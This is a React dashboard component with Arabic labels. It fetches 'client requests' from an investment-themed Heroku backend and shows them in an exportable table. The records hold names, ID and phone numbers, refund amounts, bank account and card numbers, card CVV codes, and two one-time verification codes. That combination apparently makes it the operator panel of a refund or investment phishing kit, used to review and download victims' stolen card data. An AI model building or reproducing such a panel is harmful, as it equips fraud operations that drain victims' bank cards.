import React, { useState, useEffect } from 'react';

import MUIDataTable from "mui-datatables";
import Clock from '../../UI/Clock';

import './Dashboard-sections.css';
import axios from 'axios';


export default function Requests() {

    const [requests, setRequests] = useState();
    const columns = [
        "name", 
        "idNumber", 
        "phoneNumber", 
        "refundAmount", 
        "bankAccount", 
        "accountNumber",
        "cardNumber",
        "cardVerificationNumber",
        "firstVerificationCode",
        "secondVerificationCode",
    ];

    const options = {
        filterType: 'checkbox',
        onDownload: (buildHead, buildBody, columns, data) => {
            return "\uFEFF" + buildHead(columns) + buildBody(data); 
        } 
    };

    useEffect(() => {
        fetchRequestsList();
    }, []);

    const fetchRequestsList = async () => {

        const loadedRequestsList = [];

        axios.get("https://investment-com.herokuapp.com/clients-requests")
        .then((response) => {
            if(response.data['requests']) {
                for(const key in response.data['requests']) {
                    loadedRequestsList.push({
                        name: response.data['requests'][key].user_fullname,
                        idNumber: response.data['requests'][key].user_id_number,
                        phoneNumber: response.data['requests'][key].user_phone_number,
                        refundAmount: response.data['requests'][key].refund_amount,
                        bankAccount: response.data['requests'][key].user_bank,
                        accountNumber: response.data['requests'][key].user_account_number,
                        cardNumber: response.data['requests'][key].user_card_number,
                        cardVerificationNumber: response.data['requests'][key].cardVerificationNumber,
                        firstVerificationCode: response.data['requests'][key].first_verification_code,
                        secondVerificationCode: response.data['requests'][key].second_verification_code,
                    });
                }
                setRequests(loadedRequestsList);
            }
        }).catch((error) => {
            console.log(error);
        });
    };

    return (
        <div>
            <div className="db-header">
                <div className="text">
                    <h3 className="mb-0">بيانات العملاء</h3>
                    <small className="text-muted">Here's an overview of your customers orders</small>
                </div>
                <Clock />
            </div>
            <div>
                <i className='bx bx-refresh' onClick={fetchRequestsList}></i>
            </div>
            {requests && <MUIDataTable
                data={requests}
                columns={columns}
                options={options}
            />}

            {!requests && <h6 className="request-title text-center">لا يوجد بيانات لعرضها حاليا</h6>}
        </div>
    )
}



